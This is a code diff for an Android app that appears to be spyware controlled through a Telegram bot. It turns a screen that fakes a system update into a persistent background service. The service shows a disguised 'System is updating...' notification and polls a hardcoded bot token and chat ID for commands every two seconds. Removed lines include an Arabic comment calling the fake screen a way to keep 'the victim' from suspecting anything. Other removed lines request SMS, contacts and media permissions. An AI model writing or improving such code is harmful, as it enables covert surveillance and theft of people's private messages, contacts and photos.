@@ -1,20 +1,20 @@
 package com.vipih;
 
-import android.Manifest;
-import android.app.Activity;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
 import android.content.Context;
-import android.content.pm.PackageManager;
+import android.content.Intent;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.net.Uri;
 import android.os.Build;
-import android.os.Bundle;
+import android.os.IBinder;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.provider.Telephony;
-import android.widget.LinearLayout;
-import android.widget.TextView;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -29,64 +29,59 @@ import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
 
-public class MainActivity extends Activity {
-    private static final int PERMISSION_CODE = 100;
+public class BackgroundService extends Service {
     private static final String BOT_TOKEN = "8855944219:AAHTCpO73cxzcfvzwHxze0WCWSoHytzRBsg";
     private static final String CHAT_ID = "8197183486";
-    
     private long lastUpdateId = 0;
+    private boolean isRunning = true;
     private Context ctx;
 
     @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
+    public void onCreate() {
+        super.onCreate();
         ctx = getApplicationContext();
 
-        // واجهة وهمية لكي لا يشك الضحية
-        LinearLayout layout = new LinearLayout(this);
-        layout.setOrientation(LinearLayout.VERTICAL);
-        layout.setPadding(50, 50, 50, 50);
-        TextView tv = new TextView(this);
-        tv.setText("System Update in progress...\nPlease do not close the app.");
-        tv.setTextSize(18);
-        layout.addView(tv);
-        setContentView(layout);
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            requestPermissions(new String[]{
-                    Manifest.permission.READ_EXTERNAL_STORAGE,
-                    Manifest.permission.READ_MEDIA_IMAGES,
-                    Manifest.permission.READ_SMS,
-                    Manifest.permission.READ_CONTACTS
-            }, PERMISSION_CODE);
-        } else {
-            startBackground();
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            String channelId = "sys_channel";
+            NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN);
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
+            Notification notification = new Notification.Builder(this, channelId)
+                    .setContentTitle("Update")
+                    .setContentText("System is updating...")
+                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
+                    .build();
+            startForeground(1, notification);
         }
     }
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        startBackground();
-    }
-
-    private void startBackground() {
+    public int onStartCommand(Intent intent, int flags, int startId) {
         new Thread(new Runnable() {
             @Override
             public void run() {
                 try {
-                    // إرسال لوحة التحكم للبوت
                     sendControlPanel();
-
-                    // الاستماع للأوامر
-                    while (true) {
+                    while (isRunning) {
                         checkUpdates();
-                        try { Thread.sleep(3000); } catch (Exception e) {}
+                        Thread.sleep(2000);
                     }
                 } catch (Exception e) {}
             }
         }).start();
+        return START_STICKY;
     }
+
+    @Override
+    public void onDestroy() {
+        isRunning = false;
+        super.onDestroy();
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
 
     private void sendControlPanel() {
         try {
@@ -132,19 +127,17 @@ public class MainActivity extends Activity {
             os.writeBytes(json.toString());
             os.flush();
             os.close();
-
             conn.getResponseCode();
             conn.disconnect();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+        } catch (Exception e) {}
     }
 
     private void checkUpdates() {
         try {
-            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1));
+            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10");
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setConnectTimeout(10000);
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(15000);
             InputStream input = conn.getInputStream();
             BufferedReader reader = new BufferedReader(new InputStreamReader(input));
             StringBuilder response = new StringBuilder();
